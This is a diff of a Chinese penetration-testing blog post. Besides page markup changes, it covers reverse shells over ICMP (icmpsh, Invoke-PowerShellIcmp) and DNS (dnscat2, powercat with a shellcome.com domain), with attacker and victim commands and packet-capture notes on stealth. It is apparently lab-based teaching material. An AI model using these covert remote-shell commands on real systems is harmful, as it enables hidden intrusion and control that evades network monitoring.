-<p>数据报文如下：<br></p><div class="progress-images" style="width:1330px"><div class="progress-images--placeholder" style="padding-bottom: 60.225563909774436%;"></div><img src="/images/loading.svg" alt="1442411791153.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/4158712833.png" data-thumb="/images/thumb/001d14790b54fbe628098b5dd48fa013.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1833119793.png" alt="1442411108781.png"></p>
+<p>数据报文如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/4158712833.png" alt="1442411791153.png"></p>
 <p>通过报文可以看到，除了最初的连接请求是通过HTTP传输，其他的一切数据都是通过HTTPS连接进行通信，执行的命令及返回的结果在报文中不可见。</p>
-<h2 id="0x04-ICMP-shell"><a href="#0x04-ICMP-shell" class="headerlink" title="0x04 ICMP shell"></a>0x04 ICMP shell</h2><p>这里需要一个脚本<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">icmpsh</a>,<br>Attacker执行:<br></p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">☁  icmpsh [master] sysctl -w net.ipv4.icmp_echo_ignore_all=<span class="number">1</span> #忽略所有icmp包或者ping</span><br><span class="line">net.ipv4.icmp_echo_ignore_all = <span class="number">1</span></span><br><span class="line">☁  icmpsh [master] python icmpsh_m.py <span class="number">192.168</span><span class="number">.52</span><span class="number">.131</span> <span class="number">192.168</span><span class="number">.52</span><span class="number">.1</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="0x04-ICMP-shell"><a href="#0x04-ICMP-shell" class="headerlink" title="0x04 ICMP shell"></a>0x04 ICMP shell</h2><p>这里需要一个脚本<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">icmpsh</a>,<br>Attacker执行:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">☁  icmpsh [master] sysctl -w net.ipv4.icmp_echo_ignore_all=<span class="number">1</span> #忽略所有icmp包或者ping</span><br><span class="line">net.ipv4.icmp_echo_ignore_all = <span class="number">1</span></span><br><span class="line">☁  icmpsh [master] python icmpsh_m.py <span class="number">192.168</span><span class="number">.52</span><span class="number">.131</span> <span class="number">192.168</span><span class="number">.52</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>python icmpsh_m.py   (Attacker’s IP) (Victims IP)</p>
 </blockquote>
 <p>Victim执行:</p>
-<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">Invoke-PowerShellIcmp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">Invoke-PowerShellIcmp</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.131</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">Invoke-PowerShellIcmp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">Invoke-PowerShellIcmp</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.131</span></span><br></pre></td></tr></table></figure>
 <p>执行结果：</p>
-<p></p><div class="progress-images" style="width:1448px"><div class="progress-images--placeholder" style="padding-bottom: 20.441988950276244%;"></div><img src="/images/loading.svg" alt="1442417935736.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1637791151.png" data-thumb="/images/thumb/87901dc04409dfb3d627b8a5d8d6ab41.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1637791151.png" alt="1442417935736.png"></p>
 <p>数据报文如下：</p>
-<p></p><div class="progress-images" style="width:1313px"><div class="progress-images--placeholder" style="padding-bottom: 53.00837776085301%;"></div><img src="/images/loading.svg" alt="1442418222246.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/650362795.png" data-thumb="/images/thumb/89076f3db25671881eded785aa72df6e.png"></div><br>从报文可以看出所有数据通过ICMP传输，并且执行的命令以及返回的结果均在报文中可见。<p></p>
-<h2 id="0x05-DNS-shell"><a href="#0x05-DNS-shell" class="headerlink" title="0x05 DNS shell"></a>0x05 DNS shell</h2><p>此次示例需要<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a>以及<a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">powercat</a> 。<br>安装完dnscat2后。<br>Attacker执行:<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁ <span class="built_in"> server </span>[master] ⚡ ruby dnscat2.rb shellcome.com</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/650362795.png" alt="1442418222246.png"><br>从报文可以看出所有数据通过ICMP传输，并且执行的命令以及返回的结果均在报文中可见。</p>
+<h2 id="0x05-DNS-shell"><a href="#0x05-DNS-shell" class="headerlink" title="0x05 DNS shell"></a>0x05 DNS shell</h2><p>此次示例需要<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a>以及<a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">powercat</a> 。<br>安装完dnscat2后。<br>Attacker执行:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁ <span class="built_in"> server </span>[master] ⚡ ruby dnscat2.rb shellcome.com</span><br></pre></td></tr></table></figure></p>
 <p>Victim执行:</p>
-<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">powercat</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">powercat</span> <span class="selector-tag">-c</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.131</span> <span class="selector-tag">-v</span> <span class="selector-tag">-dns</span> <span class="selector-tag">shellcome</span><span class="selector-class">.com</span> <span class="selector-tag">-ep</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">powercat</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">powercat</span> <span class="selector-tag">-c</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.131</span> <span class="selector-tag">-v</span> <span class="selector-tag">-dns</span> <span class="selector-tag">shellcome</span><span class="selector-class">.com</span> <span class="selector-tag">-ep</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>192.168.52.131 为Attacker IP地址，即shellcome.com应该解析的IP地址。</p>
 </blockquote>
-<p>执行效果:<br></p><div class="progress-images" style="width:1328px"><div class="progress-images--placeholder" style="padding-bottom: 32.454819277108435%;"></div><img src="/images/loading.svg" alt="1442419753537.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/237234968.png" data-thumb="/images/thumb/61c579fc687eb6dda966453ba6a80dc9.png"></div><p></p>
+<p>执行效果:<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/237234968.png" alt="1442419753537.png"></p>
 <p>数据报文如下：</p>
-<p></p><div class="progress-images" style="width:1324px"><div class="progress-images--placeholder" style="padding-bottom: 56.646525679758305%;"></div><img src="/images/loading.svg" alt="1442419865628.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1787636319.png" data-thumb="/images/thumb/585a2a2248fb37991e0d9fa306d91e4d.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1787636319.png" alt="1442419865628.png"></p>
 <p>通过报文可以看出所有数据通过DNS传输，并且执行的命令以及返回的结果均在报文中不可见。</p>
 <h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr>
 <p>通过以上测试，可以看出HTTPS以及DNS方式的shell更为隐蔽。如果渗透测试过程个弹不出shell，那就换个姿势吧~</p>
@@ -936,7 +953,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -947,7 +964,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -958,7 +975,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -969,7 +986,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -1021,7 +1038,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1083,8 +1100,6 @@
 
 
 
-  
-
 
 
 
@@ -1113,9 +1128,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1559,11 +1571,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1703,6 +1710,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
